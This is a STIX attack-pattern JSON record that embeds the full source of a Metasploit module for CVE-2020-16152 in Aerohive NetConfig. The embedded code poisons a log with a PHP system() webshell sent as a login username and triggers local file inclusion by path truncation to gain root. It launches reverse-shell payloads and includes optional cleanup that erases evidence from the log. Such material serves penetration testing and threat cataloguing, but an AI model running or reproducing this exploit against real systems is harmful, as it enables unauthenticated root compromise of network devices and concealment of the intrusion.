{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--02a554f5-b57d-4cd2-b36f-6d6834a30e22",
    "created": "2024-08-14T17:14:02.942438Z",
    "modified": "2024-08-14T17:14:02.942441Z",
    "name": "Aerohive NetConfig 10.0r8a LFI and log poisoning to RCE",
    "description": " This module exploits LFI and log poisoning vulnerabilities",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/aerohive_netconfig_lfi_log_poison_rce.rb",
            "external_id": "aerohive_netconfig_lfi_log_poison_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/eriknl/CVE-2020-16152#analysisandPoCcode"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Aerohive NetConfig 10.0r8a LFI and log poisoning to RCE',\n        'Description' => %q{\n          This module exploits LFI and log poisoning vulnerabilities\n          (CVE-2020-16152) in Aerohive NetConfig, version 10.0r8a\n          build-242466 and older in order to achieve unauthenticated remote\n          code execution as the root user. NetConfig is the Aerohive/Extreme\n          Networks HiveOS administrative webinterface. Vulnerable versions\n          allow for LFI because they rely on a version of PHP 5 that is\n          vulnerable to string truncation attacks. This module leverages this\n          issue in conjunction with log poisoning to gain RCE as root.\n\n          Upon successful exploitation, the Aerohive NetConfig application\n          may hang for as long as the spawned shell remains open. For the\n          Linux target, the MeterpreterTryToFork option (enabled by default)\n          will likely prevent this. If the app hangs, closing the session\n          should render it responsive again.\n\n          The module provides an automatic cleanup option to clean the log.\n          However, this option is disabled by default because any modifications\n          to the /tmp/messages log, even via sed, may render the target\n          (temporarily) unexploitable. This state can last over an hour.\n\n          This module has been successfully tested against Aerohive NetConfig\n          versions 8.2r4 and 10.0r7a.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Erik de Jong', # github.com/eriknl - discovery and PoC\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          ['CVE', '2020-16152'], # still categorized as RESERVED\n          ['URL', 'https://github.com/eriknl/CVE-2020-16152'] # analysis and PoC code\n        ],\n        'DefaultOptions' => {\n          'SSL' => true,\n          'RPORT' => 443\n        },\n        'Platform' => %w[linux unix],\n        'Arch' => [ ARCH_ARMLE, ARCH_CMD ],\n        'Targets' => [\n          [\n            'Linux', {\n              'Arch' => [ARCH_ARMLE],\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp',\n                'CMDSTAGER::FLAVOR' => 'curl',\n                'MeterpreterTryToFork' => true # prevent the web server from hanging when we get a meterpreter session\n              }\n            }\n          ],\n          [\n            'CMD', {\n              'Arch' => [ARCH_CMD],\n              'Platform' => 'unix',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_openssl' # this may be the only payload that works for this target'\n              }\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2020-02-17',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'The base path to Aerohive NetConfig', '/']),\n      OptBool.new('AUTO_CLEAN_LOG', [true, 'Automatically clean the /tmp/messages log upon spawning a shell. WARNING! This may render the target unexploitable', false]),\n    ]\n  end\n\n  def auto_clean_log\n    datastore['AUTO_CLEAN_LOG']\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.php5')\n    })\n\n    unless res\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    unless res.code == 200 && res.body.include?('Aerohive NetConfig UI')\n      return CheckCode::Safe('Target is not an Aerohive NetConfig application.')\n    end\n\n    version = res.body.scan(/action=\"login\\.php5\\?version=(.*?)\"/)&.flatten&.first\n    unless version\n      return CheckCode::Detected('Could not determine Aerohive NetConfig version.')\n    end\n\n    begin\n      # Rex::Version treats 10.0r8 as higher than 10.0r8a but 10.0r8 is affected and was probably released before 10.0r8a\n      if Rex::Version.new(version) <= Rex::Version.new('10.0r8a') || version == '10.0r8'\n        return CheckCode::Appears(\"The target is Aerohive NetConfig version #{version}\")\n      else\n        print_warning('It should be noted that it is unclear if/when this issue was patched, so versions after 10.0r8a may still be vulnerable.')\n        return CheckCode::Safe(\"The target is Aerohive NetConfig version #{version}\")\n      end\n    rescue StandardError => e\n      return CheckCode::Unknown(\"Failed to obtain a valid Aerohive NetConfig version: #{e}\")\n    end\n  end\n\n  def poison_log\n    password = rand_text_alphanumeric(8..12)\n    @shell_cmd_name = rand_text_alphanumeric(3..6)\n    @poison_cmd = \"<?php system($_POST['#{@shell_cmd_name}']);?>\"\n\n    # Poison /tmp/messages\n    print_status('Attempting to poison the log at /tmp/messages...')\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'login.php5'),\n      'vars_post' => {\n        'login_auth' => 0,\n        'miniHiveUI' => 1,\n        'authselect' => 'Name/Password',\n        'userName' => @poison_cmd,\n        'password' => password\n      }\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, 'Connection failed while trying to poison the log at /tmp/messages')\n    end\n\n    unless res.code == 200 && res.body.include?('cmn/redirectLogin.php5?ERROR_TYPE=MQ==')\n      fail_with(Failure::UnexpectedReply, 'Unexpected response received while trying to poison the log at /tmp/messages')\n    end\n\n    print_status('Server responded as expected. Continuing...')\n  end\n\n  def on_new_session(session)\n    log_cleaned = false\n    if auto_clean_log\n      print_status('Attempting to clean the log file at /tmp/messages...')\n      print_warning('Please note this will render the target (temporarily) unexploitable. This state can last over an hour.')\n      begin\n        # We need remove the line containing the PHP system call from /tmp/messages\n        # The special chars in the PHP syscall make it nearly impossible to use sed to replace the PHP syscall with a regular username.\n        # Instead, let's avoid special chars by stringing together some grep commands to make sure we have the right line and then removing that entire line\n        # The impact of using sed to edit the file on the fly and using grep to create a new file and overwrite /tmp/messages with it, is the same:\n        # In both cases the app will likely stop writing to /tmp/messages for quite a while (could be over an hour), rendering the target unexploitable during that period.\n        line_to_delete_file = \"/tmp/#{rand_text_alphanumeric(5..10)}\"\n        clean_messages_file = \"/tmp/#{rand_text_alphanumeric(5..10)}\"\n        cmds_to_clean_log = \"grep #{@shell_cmd_name} /tmp/messages | grep POST | grep 'php system' > #{line_to_delete_file}; \"\\\n        \"grep -vFf #{line_to_delete_file} /tmp/messages > #{clean_messages_file}; mv #{clean_messages_file} /tmp/messages; rm -f #{line_to_delete_file}\"\n\n        if session.type.to_s.eql? 'meterpreter'\n          session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'\n\n          session.sys.process.execute('/bin/sh', \"-c \\\"#{cmds_to_clean_log}\\\"\")\n\n          # Wait for cleanup\n          Rex.sleep 5\n\n          # Check for the PHP system call in /tmp/messages\n          messages_contents = session.fs.file.open('/tmp/messages').read.to_s\n          # using =~ here produced unexpected results, so include? is used instead\n          unless messages_contents.include?(@poison_cmd)\n            log_cleaned = true\n          end\n        elsif session.type.to_s.eql?('shell')\n          session.shell_command_token(cmds_to_clean_log.to_s)\n\n          # Check for the PHP system call in /tmp/messages\n          poison_evidence = session.shell_command_token(\"grep #{@shell_cmd_name} /tmp/messages | grep POST | grep 'php system'\")\n          # using =~ here produced unexpected results, so include? is used instead\n          unless poison_evidence.include?(@poison_cmd)\n            log_cleaned = true\n          end\n        end\n      rescue StandardError => e\n        print_error(\"Error during cleanup: #{e.message}\")\n      ensure\n        super\n      end\n\n      unless log_cleaned\n        print_warning(\"Could not replace the PHP system call '#{@poison_cmd}' in /tmp/messages\")\n      end\n    end\n\n    if log_cleaned\n      print_good('Successfully cleaned up the log by deleting the line with the PHP syscal from /tmp/messages.')\n    else\n      print_warning(\"Erasing the log poisoning evidence will require manually editing/removing the line in /tmp/messages that contains the poison command:\\n\\t#{@poison_cmd}\")\n      print_warning('Please note that any modifications to /tmp/messages, even via sed, will render the target (temporarily) unexploitable. This state can last over an hour.')\n      print_warning('Deleting /tmp/messages or clearing out the file may break the application.')\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    print_status('Attempting to execute the payload')\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'action.php5'),\n      'vars_get' => {\n        '_action' => 'list',\n        'debug' => 'true'\n      },\n      'vars_post' => {\n        '_page' => rand_text_alphanumeric(1) + '/..' * 8 + '/' * 4041 + '/tmp/messages',  # Trigger LFI through path truncation\n        @shell_cmd_name => cmd\n      }\n    }, 0)\n\n    print_warning('In case of successful exploitation, the Aerohive NetConfig web application will hang for as long as the spawned shell remains open.')\n  end\n\n  def exploit\n    poison_log\n    if target.arch.first == ARCH_CMD\n      print_status('Executing the payload')\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-02-17",
    "x_mitre_platforms": [
        "unix'"
    ]
}